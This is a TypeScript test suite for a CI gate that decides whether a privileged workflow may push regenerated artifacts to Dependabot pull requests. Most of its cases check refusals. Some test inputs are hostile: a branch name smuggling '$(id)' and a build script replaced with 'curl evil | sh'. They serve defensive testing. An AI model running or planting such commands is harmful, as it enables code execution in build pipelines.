/**
 * Checks on the regeneration eligibility gate (ADR-0041).
 *
 * The gate decides whether a privileged workflow may push to a pull request, so
 * the cases that matter most are refusals. Each rule in the module comment has a
 * case here that observes it refusing (ADR-0016), built by breaking exactly one
 * property of an otherwise eligible input. The positive cases pin the two
 * shapes that must pass: a fresh Dependabot pull request, and a second run on
 * one that already carries a regeneration commit — the case review of ADR-0041
 * found the first draft of the rules would have refused.
 */

import { describe, expect, test } from 'bun:test';
import {
  DEPENDABOT_LOGIN,
  type EligibilityInput,
  evaluateEligibility,
  flattenPages,
  isArtifactFile,
  isDependencyFile,
  overlayManifest,
  parseArgs,
} from './check-regeneration-eligibility.ts';

const HEAD = 'a'.repeat(40);
const APP = 'adrkit-regenerate[bot]';

const CORE_BASE = JSON.stringify({
  name: '@adrkit/core',
  scripts: { build: 'bun build' },
  dependencies: { yaml: '^2.9.0' },
});
const CORE_HEAD = JSON.stringify({
  name: '@adrkit/core',
  scripts: { build: 'bun build' },
  dependencies: { yaml: '^2.9.1' },
});

function eligible(): EligibilityInput {
  return {
    pr: {
      state: 'open',
      changed_files: 2,
      user: { login: DEPENDABOT_LOGIN },
      base: { ref: 'main', repo: { full_name: 'mbeacom/adrkit' } },
      head: { sha: HEAD, ref: 'dependabot/bun/yaml-2.9.1', repo: { full_name: 'mbeacom/adrkit' } },
    },
    commits: [{ sha: 'c1', author: { login: DEPENDABOT_LOGIN }, parents: [{}] }],
    files: [
      { filename: 'bun.lock', status: 'modified' },
      { filename: 'packages/core/package.json', status: 'modified' },
    ],
    grantedHead: HEAD,
    defaultBranch: 'main',
    appLogin: APP,
    commitPaths: { c1: ['bun.lock', 'packages/core/package.json'] },
    manifests: { 'packages/core/package.json': { base: CORE_BASE, head: CORE_HEAD } },
  };
}

function refusalsFor(mutate: (input: EligibilityInput) => void): string[] {
  const input = eligible();
  mutate(input);
  const result = evaluateEligibility(input);
  expect(result.eligible).toBe(false);
  return result.refusals;
}

describe('eligible pull requests pass', () => {
  test('a fresh Dependabot pull request', () => {
    const result = evaluateEligibility(eligible());
    expect(result).toEqual({
      eligible: true,
      refusals: [],
      dependencyFiles: ['bun.lock', 'packages/core/package.json'],
    });
  });

  test('a second run over an earlier regeneration commit', () => {
    const input = eligible();
    input.commits = [...input.commits, { sha: 'r1', author: { login: APP }, parents: [{}] }];
    input.commitPaths.r1 = ['packages/ci/dist/index.js', 'schema/adr.schema.json'];
    input.files = [
      ...input.files,
      { filename: 'packages/ci/dist/index.js', status: 'modified' },
      { filename: 'schema/adr.schema.json', status: 'modified' },
    ];
    input.pr.changed_files = 4;
    expect(evaluateEligibility(input).eligible).toBe(true);
  });

  test('a manifest reformatted but otherwise unchanged apart from dependencies', () => {
    const input = eligible();
    input.manifests['packages/core/package.json'] = {
      base: CORE_BASE,
      head: JSON.stringify(JSON.parse(CORE_HEAD), null, 4),
    };
    expect(evaluateEligibility(input).eligible).toBe(true);
  });
});

describe('each rule refuses', () => {
  test('a pull request that is not open', () => {
    expect(refusalsFor((i) => (i.pr.state = 'closed')).join()).toContain('not open');
  });

  test('a pull request not opened by Dependabot', () => {
    expect(refusalsFor((i) => (i.pr.user = { login: 'mallory' })).join()).toContain('opened by mallory');
  });

  test('a pull request against another branch', () => {
    expect(refusalsFor((i) => (i.pr.base!.ref = 'release')).join()).toContain('targets release');
  });

  test('a head in another repository', () => {
    expect(refusalsFor((i) => (i.pr.head!.repo = { full_name: 'mallory/adrkit' })).join()).toContain(
      'mallory/adrkit',
    );
  });

  test('a head with no repository at all', () => {
    expect(refusalsFor((i) => (i.pr.head!.repo = null)).join()).toContain('unknown repository');
  });

  test('a branch that is not dependabot/…', () => {
    expect(refusalsFor((i) => (i.pr.head!.ref = 'feature/x')).join()).toContain('not a dependabot/');
  });

  test('a branch name carrying shell or URL metacharacters', () => {
    expect(refusalsFor((i) => (i.pr.head!.ref = 'dependabot/x;$(id)')).join()).toContain('not a dependabot/');
  });

  test('a head that moved after labelling', () => {
    expect(refusalsFor((i) => (i.pr.head!.sha = 'b'.repeat(40))).join()).toContain('head moved');
  });

  test('a granted head that is not a SHA', () => {
    expect(refusalsFor((i) => (i.grantedHead = 'main')).join()).toContain('head moved');
  });

  test('a commit authored by someone else', () => {
    const refusals = refusalsFor((i) => i.commits.push({ sha: 'x', author: { login: 'mallory' }, parents: [{}] }));
    expect(refusals.join()).toContain('authored by mallory');
  });

  test('a commit whose author GitHub could not link', () => {
    const refusals = refusalsFor((i) => i.commits.push({ sha: 'x', author: null, parents: [{}] }));
    expect(refusals.join()).toContain('could not link');
  });

  test('a merge commit, such as "Update branch"', () => {
    const refusals = refusalsFor((i) =>
      i.commits.push({ sha: 'm', author: { login: DEPENDABOT_LOGIN }, parents: [{}, {}] }),
    );
    expect(refusals.join()).toContain('is a merge');
  });

  test('an App commit touching a non-artifact path', () => {
    const refusals = refusalsFor((i) => {
      i.commits.push({ sha: 'r1', author: { login: APP }, parents: [{}] });
      i.commitPaths.r1 = ['packages/ci/dist/index.js', 'scripts/check-dco.ts'];
    });
    expect(refusals.join()).toContain('outside the regenerated artifacts');
  });

  test('a Dependabot commit touching anything but dependency files', () => {
    const refusals = refusalsFor((i) => (i.commitPaths.c1 = ['bun.lock', 'packages/ci/dist/index.js']));
    expect(refusals.join()).toContain('not a dependency file');
  });

  test('a Dependabot commit whose paths could not be read', () => {
    const refusals = refusalsFor((i) => delete i.commitPaths.c1);
    expect(refusals.join()).toContain('not a dependency file');
  });

  // The review finding on #231: an App commit wrote the artifact, but so did a
  // commit that is not a validated App commit. One App commit must not launder it.
  test('an artifact that a non-App commit also touched, on a second run', () => {
    const refusals = refusalsFor((i) => {
      i.commits.push({ sha: 'r1', author: { login: APP }, parents: [{}] });
      i.commitPaths.r1 = ['packages/ci/dist/index.js'];
      i.commitPaths.c1 = ['bun.lock', 'packages/core/package.json', 'packages/ci/dist/index.js'];
      i.files.push({ filename: 'packages/ci/dist/index.js', status: 'modified' });
      i.pr.changed_files = 3;
    });
    expect(refusals.join()).toContain('not a dependency file');
    expect(refusals.join()).toContain('packages/ci/dist/index.js is neither');
  });

  test('an App commit when no App is configured', () => {
    const refusals = refusalsFor((i) => {
      i.appLogin = undefined;
      i.commits.push({ sha: 'r1', author: { login: APP }, parents: [{}] });
      i.commitPaths.r1 = ['packages/ci/dist/index.js'];
    });
    expect(refusals.join()).toContain(`authored by ${APP}`);
  });

  test('an empty commit list', () => {
    expect(refusalsFor((i) => (i.commits = [])).join()).toContain('commit list is empty');
  });

  test('a file outside the allowlist', () => {
    const refusals = refusalsFor((i) => {
      i.files.push({ filename: 'scripts/check-dco.ts', status: 'modified' });
      i.pr.changed_files = 3;
    });
    expect(refusals.join()).toContain('scripts/check-dco.ts is neither');
  });

  test('a site/ manifest, which is out of scope', () => {
    const refusals = refusalsFor((i) => {
      i.files.push({ filename: 'site/package.json', status: 'modified' });
      i.pr.changed_files = 3;
    });
    expect(refusals.join()).toContain('site/package.json is neither');
  });

  test('an artifact path no App commit wrote', () => {
    const refusals = refusalsFor((i) => {
      i.files.push({ filename: 'packages/ci/dist/index.js', status: 'modified' });
      i.pr.changed_files = 3;
    });
    expect(refusals.join()).toContain('packages/ci/dist/index.js is neither');
  });

  test('an added or removed dependency file', () => {
    expect(refusalsFor((i) => (i.files[0]!.status = 'added')).join()).toContain('bun.lock is added');
  });

  test('a manifest that changes its scripts', () => {
    const refusals = refusalsFor((i) => {
      const head = JSON.parse(CORE_HEAD);
      head.scripts.build = 'curl evil | sh';
      i.manifests['packages/core/package.json'] = { base: CORE_BASE, head: JSON.stringify(head) };
    });
    expect(refusals.join()).toContain('changes more than its dependency fields');
  });

  test('a manifest that cannot be read or parsed', () => {
    const refusals = refusalsFor((i) => {
      i.manifests['packages/core/package.json'] = { base: CORE_BASE, head: '{not json' };
    });
    expect(refusals.join()).toContain('changes more than its dependency fields');
  });

  test('a file listing shorter than the pull request reports', () => {
    expect(refusalsFor((i) => (i.pr.changed_files = 3001)).join()).toContain('partial list');
  });

  test('no dependency file at all', () => {
    const refusals = refusalsFor((i) => {
      i.files = [];
      i.pr.changed_files = 0;
    });
    expect(refusals.join()).toContain('nothing to regenerate from');
  });

  test('every failure is reported, not only the first', () => {
    const refusals = refusalsFor((i) => {
      i.pr.user = { login: 'mallory' };
      i.pr.state = 'closed';
    });
    expect(refusals.length).toBeGreaterThanOrEqual(2);
  });
});

describe('path classes', () => {
  test('dependency files are the root workspace only', () => {
    for (const p of ['bun.lock', 'package.json', 'packages/core/package.json', 'packages/adapters/spec-kit/package.json']) {
      expect(isDependencyFile(p)).toBe(true);
    }
    for (const p of ['site/bun.lock', 'site/package.json', 'packages/core/src/package.json', 'packages/../package.json']) {
      expect(isDependencyFile(p)).toBe(false);
    }
  });

  test('artifacts are the two bundles and the schema, nothing nested or traversing', () => {
    for (const p of ['packages/ci/dist/index.js', 'packages/ci/dist/queue-action.js', 'schema/adr.schema.json']) {
      expect(isArtifactFile(p)).toBe(true);
    }
    for (const p of ['packages/ci/dist/sub/x.js', 'packages/ci/dist/../src/x.js', 'schema/adr.schema.ts', 'packages/ci/src/index.ts']) {
      expect(isArtifactFile(p)).toBe(false);
    }
  });
});

describe('overlay keeps the default branch in charge', () => {
  test('only dependency fields come from the pull request', () => {
    const onDefault = JSON.stringify({ name: 'x', scripts: { build: 'main-build' }, dependencies: { a: '^1' } });
    const onHead = JSON.stringify({ name: 'x', scripts: { build: 'stale-build' }, dependencies: { a: '^2' } });
    expect(JSON.parse(overlayManifest(onDefault, onHead))).toEqual({
      name: 'x',
      scripts: { build: 'main-build' },
      dependencies: { a: '^2' },
    });
  });

  test('a dependency field the pull request dropped is dropped', () => {
    const onDefault = JSON.stringify({ name: 'x', devDependencies: { b: '^1' } });
    expect(JSON.parse(overlayManifest(onDefault, JSON.stringify({ name: 'x' })))).toEqual({ name: 'x' });
  });

  test('a manifest that is not an object is refused', () => {
    expect(() => overlayManifest('[]', '{}')).toThrow('not a JSON object');
  });
});

describe('inputs that cannot be read are refused', () => {
  test('pages must be an array of arrays', () => {
    expect(flattenPages([[1], [2]])).toEqual([1, 2]);
    expect(() => flattenPages({})).toThrow();
    expect(() => flattenPages([{}])).toThrow();
  });

  test('arguments must name a mode and pair every flag', () => {
    expect(parseArgs(['check', '--pr', 'p.json']).flags.get('pr')).toBe('p.json');
    expect(() => parseArgs(['push'])).toThrow('usage');
    expect(() => parseArgs(['check', '--pr'])).toThrow('malformed');
  });
});
